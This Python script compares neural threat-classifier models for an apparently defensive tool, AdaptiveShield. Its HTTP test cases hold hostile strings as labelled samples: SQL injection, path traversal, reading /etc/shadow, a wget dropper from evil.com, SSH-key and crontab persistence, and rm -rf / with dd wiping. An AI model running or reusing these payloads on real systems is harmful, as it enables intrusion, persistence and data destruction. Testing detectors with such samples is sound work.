#!/usr/bin/env python
"""
Model Comparison Script for AdaptiveShield.

Compares all available trained models (v5 old architecture + v6 unified)
against the same test data, reporting per-class F1, confusion matrices,
inference latency, and HTTP attack detection accuracy.

Usage:
    PYTHONPATH=src python3 src/training/neural/compare_models.py
"""

import sys
import time
import json
import torch
import numpy as np
import pandas as pd
from pathlib import Path
from collections import OrderedDict
from sklearn.metrics import (
    classification_report, confusion_matrix, f1_score, accuracy_score
)

# Add src to path
src_path = Path(__file__).parent.parent.parent
sys.path.insert(0, str(src_path))

from training.neural.model import UnifiedThreatClassifier, ThreatClassifier
from training.neural.dataset import (
    load_dataset, create_dataloaders, ThreatDataset, CommandTokenizer
)

CLASS_NAMES = ['Safe', 'Recon', 'Downloader', 'Exploit', 'Destructive', 'ADVANCED_APT']

# ──────────────────────────────────────────────────────────────────────
# HTTP attack test cases (synthetic probes the old model never trained on)
# ──────────────────────────────────────────────────────────────────────

HTTP_TEST_CASES = [
    # (commands, expected_class_name, description)
    ("GET /index.html HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0", "Safe", "Normal HTTP GET"),
    ("GET /favicon.ico HTTP/1.1\nHost: example.com", "Safe", "Favicon request"),
    ("GET /login?user=admin'%20OR%201=1-- HTTP/1.1\nHost: target.com", "Exploit", "SQL injection in URL"),
    ("POST /api/login HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=' OR '1'='1", "Exploit", "SQL injection in POST body"),
    ("GET /../../../../../../etc/passwd HTTP/1.1\nHost: target.com", "Exploit", "Path traversal"),
    ("GET /cgi-bin/test.cgi?cmd=cat%20/etc/shadow HTTP/1.1\nHost: target.com", "Exploit", "Command injection"),
    ("GET /admin HTTP/1.1\nHost: target.com\nUser-Agent: nikto", "Recon", "Nikto scanner"),
    ("GET /phpinfo.php HTTP/1.1\nHost: target.com\nUser-Agent: gobuster/3.1", "Recon", "Directory enumeration"),
    ("GET /index.html HTTP/1.1\nHost: target.com; wget http://evil.com/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m", "Downloader", "HTTP + wget dropper"),
    ("POST /upload/backdoor.php HTTP/1.1\nHost: target.com; echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys; crontab -l | { cat; echo '*/5 * * * * /tmp/beacon'; } | crontab -", "ADVANCED_APT", "HTTP backdoor + persistence"),
    ("GET / HTTP/1.1\nHost: target.com; rm -rf /; dd if=/dev/zero of=/dev/sda", "Destructive", "HTTP + destructive commands"),
    ("GET / HTTP/1.1\nHost: target.com; id; whoami; uname -a; cat /etc/passwd; netstat -tlnp; ps aux", "Recon", "HTTP + recon commands"),
]


def load_unified_model(model_path: str) -> UnifiedThreatClassifier:
    """Load a v6 UnifiedThreatClassifier from .pt file."""
    checkpoint = torch.load(model_path, map_location='cpu', weights_only=False)
    model = UnifiedThreatClassifier()
    model.load_state_dict(checkpoint['model_state_dict'])
    model.eval()
    return model


def load_old_v5_model(model_path: str) -> ThreatClassifier:
    """Load a v5 ThreatClassifier from .pt file."""
    checkpoint = torch.load(model_path, map_location='cpu', weights_only=False)
    config = checkpoint.get('model_config', {})
    model = ThreatClassifier(**config)
    model.load_state_dict(checkpoint['model_state_dict'])
    model.eval()
    return model


def encode_commands(commands: str, max_length: int = 2048):
    """Inline char-level tokenizer matching decision.py."""
    indices = []
    for char in commands[:max_length]:
        code = ord(char)
        indices.append(code if code < 256 else 1)
    length = len(indices)
    if len(indices) < max_length:
        indices = indices + [0] * (max_length - len(indices))
    indices = indices[:max_length]
    return (
        torch.tensor([indices], dtype=torch.long),
        torch.tensor([min(length, max_length)], dtype=torch.long),
    )


def extract_mitre_features(commands: str):
    """Extract 21-dim MITRE features."""
    from core.mitre.session_annotator import annotate_session, annotation_to_flat_dict, get_mitre_feature_columns

    cmd_list = [c.strip() for c in commands.replace("&&", ";").replace("||", ";").replace("\\n", ";").split(";") if c.strip()]
    if not cmd_list:
        cmd_list = [commands]
    annotation = annotate_session(cmd_list)
    flat = annotation_to_flat_dict(annotation)
    cols = get_mitre_feature_columns()
    return [flat.get(col, 0.0) for col in cols]


def infer_unified(model: UnifiedThreatClassifier, commands: str, max_length: int = 2048):
    """Run unified model inference on a single command string."""
    encoded, lengths = encode_commands(commands, max_length)
    mitre_features = extract_mitre_features(commands)
    mitre = torch.tensor([mitre_features], dtype=torch.float32)
    changes = torch.zeros((1, 20), dtype=torch.float32)
    triage = torch.zeros((1, 70), dtype=torch.float32)
    modality_mask = torch.tensor([[False, False, True, True]], dtype=torch.bool)

    with torch.no_grad():
        preds, probs = model.predict(encoded, mitre, changes, triage, lengths, modality_mask)

    pred_class = preds[0].item()
    confidence = float(probs[0][pred_class])
    return pred_class, CLASS_NAMES[pred_class], confidence, probs[0].cpu().numpy()


def infer_old_v5(model: ThreatClassifier, commands: str, max_length: int = 512):
    """Run old v5 model inference on a single command string."""
    encoded, lengths = encode_commands(commands, max_length)
    mitre_features = extract_mitre_features(commands)
    mitre = torch.tensor([mitre_features], dtype=torch.float32)

    # Old model uses a single 100-dim structured vector (21 MITRE + 79 binary features)
    # At runtime, the binary features are zeros, so pad with 79 zeros
    structured = torch.zeros((1, 100), dtype=torch.float32)
    structured[0, :21] = mitre[0]

    with torch.no_grad():
        preds, probs = model.predict(encoded, structured, lengths)

    pred_class = preds[0].item()
    confidence = float(probs[0][pred_class])
    return pred_class, CLASS_NAMES[pred_class], confidence, probs[0].cpu().numpy()


def evaluate_on_dataloader(model, data_loader, model_type='unified'):
    """Evaluate model on a DataLoader, return metrics."""
    all_preds = []
    all_labels = []
    all_probs = []
    total_time = 0.0
    n_samples = 0

    with torch.no_grad():
        for batch in data_loader:
            commands = batch['commands']
            lengths = batch['lengths']
            labels = batch['labels']

            start = time.perf_counter()

            if model_type == 'unified':
                mitre = batch['mitre']
                changes = batch['changes']
                triage = batch['triage']
                modality_mask = batch['modality_mask']
                logits = model(commands, mitre, changes, triage, lengths, modality_mask)
            else:
                # Old v5 model: needs structured input (100-dim)
                mitre = batch['mitre']
                structured = torch.zeros((commands.size(0), 100), dtype=torch.float32)
                structured[:, :21] = mitre
                logits = model(commands, structured, lengths)

            elapsed = time.perf_counter() - start
            total_time += elapsed
            n_samples += commands.size(0)

            probs = torch.softmax(logits, dim=1).numpy()
            preds = np.argmax(probs, axis=1)

            all_preds.extend(preds)
            all_labels.extend(labels.numpy())
            all_probs.extend(probs)

    all_preds = np.array(all_preds)
    all_labels = np.array(all_labels)

    acc = accuracy_score(all_labels, all_preds)
    macro_f1 = f1_score(all_labels, all_preds, average='macro', zero_division=0)
    per_class_f1 = f1_score(all_labels, all_preds, average=None, zero_division=0, labels=range(6))
    cm = confusion_matrix(all_labels, all_preds, labels=range(6))
    avg_latency_ms = (total_time / n_samples * 1000) if n_samples > 0 else 0

    return {
        'accuracy': acc,
        'macro_f1': macro_f1,
        'per_class_f1': per_class_f1,
        'confusion_matrix': cm,
        'avg_latency_ms': avg_latency_ms,
        'n_samples': n_samples,
    }


def run_http_tests(model, model_type='unified', max_length=2048):
    """Run HTTP attack test cases and return results."""
    results = []
    for commands, expected, description in HTTP_TEST_CASES:
        if model_type == 'unified':
            pred_id, pred_name, conf, probs = infer_unified(model, commands, max_length)
        else:
            pred_id, pred_name, conf, probs = infer_old_v5(model, commands, min(max_length, 512))

        correct = pred_name == expected
        results.append({
            'description': description,
            'expected': expected,
            'predicted': pred_name,
            'confidence': conf,
            'correct': correct,
        })
    return results


def print_comparison_table(all_results: dict):
    """Print a formatted comparison table."""
    print(f"\n{'='*90}")
    print(" MODEL COMPARISON RESULTS")
    print(f"{'='*90}")

    # Header
    model_names = list(all_results.keys())
    header = f"{'Metric':<25}"
    for name in model_names:
        header += f" {name:<20}"
    print(header)
    print("-" * 90)

    # Accuracy
    row = f"{'Test Accuracy':<25}"
    for name in model_names:
        row += f" {all_results[name]['accuracy']:<20.4f}"
    print(row)

    # Macro F1
    row = f"{'Macro F1':<25}"
    for name in model_names:
        row += f" {all_results[name]['macro_f1']:<20.4f}"
    print(row)

    # Latency
    row = f"{'Avg Latency (ms/sample)':<25}"
    for name in model_names:
        row += f" {all_results[name]['avg_latency_ms']:<20.2f}"
    print(row)

    print()

    # Per-class F1
    print("Per-Class F1 Scores:")
    print("-" * 90)
    for i, cls in enumerate(CLASS_NAMES):
        row = f"  {cls:<23}"
        for name in model_names:
            f1 = all_results[name]['per_class_f1']
            val = f1[i] if i < len(f1) else 0.0
            row += f" {val:<20.4f}"
        print(row)

    print()

    # HTTP test results
    print("HTTP Attack Detection:")
    print("-" * 90)
    for name in model_names:
        http = all_results[name].get('http_results', [])
        correct = sum(1 for r in http if r['correct'])
        total = len(http)
        print(f"  {name}: {correct}/{total} correct")
        for r in http:
            status = "✓" if r['correct'] else "✗"
            print(f"    {status} {r['description']:<35} expected={r['expected']:<12} got={r['predicted']:<12} conf={r['confidence']:.2f}")
    print()


def main():
    print(f"\n{'='*90}")
    print(" AdaptiveShield Model Comparison")
    print(f"{'='*90}")

    # ── Discover models ──
    models_to_compare = OrderedDict()

    project_root = Path(__file__).parent.parent.parent.parent
    models_dir = project_root / "models"
    checkpoints_dir = project_root / "checkpoints"

    # New v6 unified models (from models/ dir)
    for pt in sorted(models_dir.glob("brain_v6_neural*.pt")):
        if 'results' not in pt.name:
            name = pt.stem
            models_to_compare[name] = {'path': str(pt), 'type': 'unified'}

    # Checkpoints (v6 unified)
    for pt in sorted(checkpoints_dir.glob("best_model*.pt")):
        name = f"ckpt_{pt.stem}"
        models_to_compare[name] = {'path': str(pt), 'type': 'unified'}

    # Old v5 models (different architecture)
    v5_path = models_dir / "brain_v5_neural.pt"
    if v5_path.exists():
        models_to_compare['brain_v5_neural'] = {'path': str(v5_path), 'type': 'old_v5'}

    print(f"\nDiscovered {len(models_to_compare)} models:")
    for name, info in models_to_compare.items():
        print(f"  {name:<35} [{info['type']}] {info['path']}")

    # ── Load test data ──
    print(f"\nLoading test dataset...")
    train_ds, val_ds, test_ds, tokenizer = load_dataset(
        max_length=2048,
        downsample_safe=5000,
        random_state=42
    )
    print(f"  Test set: {len(test_ds)} samples")

    _, _, test_loader = create_dataloaders(
        train_ds, val_ds, test_ds,
        batch_size=32,
        num_workers=0
    )

    # ── Evaluate each model ──
    all_results = OrderedDict()

    for name, info in models_to_compare.items():
        print(f"\n{'─'*60}")
        print(f"Evaluating: {name}")
        print(f"{'─'*60}")

        try:
            if info['type'] == 'unified':
                model = load_unified_model(info['path'])
                metrics = evaluate_on_dataloader(model, test_loader, model_type='unified')
                http_results = run_http_tests(model, model_type='unified', max_length=2048)
            else:
                model = load_old_v5_model(info['path'])
                metrics = evaluate_on_dataloader(model, test_loader, model_type='old_v5')
                http_results = run_http_tests(model, model_type='old_v5', max_length=512)

            metrics['http_results'] = http_results
            all_results[name] = metrics

            print(f"  Accuracy: {metrics['accuracy']:.4f}")
            print(f"  Macro F1: {metrics['macro_f1']:.4f}")
            print(f"  Latency:  {metrics['avg_latency_ms']:.2f} ms/sample")

        except Exception as e:
            print(f"  FAILED: {e}")
            import traceback
            traceback.print_exc()

    # ── Print comparison ──
    if all_results:
        print_comparison_table(all_results)

        # ── Recommendation ──
        print(f"{'='*90}")
        print(" RECOMMENDATION")
        print(f"{'='*90}")
        best_name = max(all_results, key=lambda k: all_results[k]['macro_f1'])
        best = all_results[best_name]
        http_correct = sum(1 for r in best.get('http_results', []) if r['correct'])
        http_total = len(best.get('http_results', []))
        print(f"  Best model by macro F1: {best_name} (F1={best['macro_f1']:.4f}, HTTP={http_correct}/{http_total})")

        # Check if any model has better HTTP detection
        best_http_name = max(all_results, key=lambda k: sum(1 for r in all_results[k].get('http_results', []) if r['correct']))
        best_http = all_results[best_http_name]
        bh_correct = sum(1 for r in best_http.get('http_results', []) if r['correct'])
        if best_http_name != best_name:
            print(f"  Best model by HTTP detection: {best_http_name} (HTTP={bh_correct}/{http_total}, F1={best_http['macro_f1']:.4f})")
            print(f"  ⚠ HTTP detection leader differs from F1 leader — review tradeoff")

        print()


if __name__ == '__main__':
    main()
